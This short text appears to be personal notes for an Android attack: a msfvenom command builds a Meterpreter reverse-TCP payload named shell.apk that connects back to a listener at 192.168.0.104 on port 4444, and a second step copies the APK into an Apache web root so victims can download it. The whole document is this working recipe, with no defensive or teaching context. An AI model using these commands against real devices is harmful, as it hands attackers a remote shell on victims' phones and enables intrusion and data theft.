
  Creating a payload for android:
  --------------------------
  
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 R> shell.apk
    
  Starting apache2 server:
  --------------------------
  cp shell.apk /var/www/html/
    
    
    
 
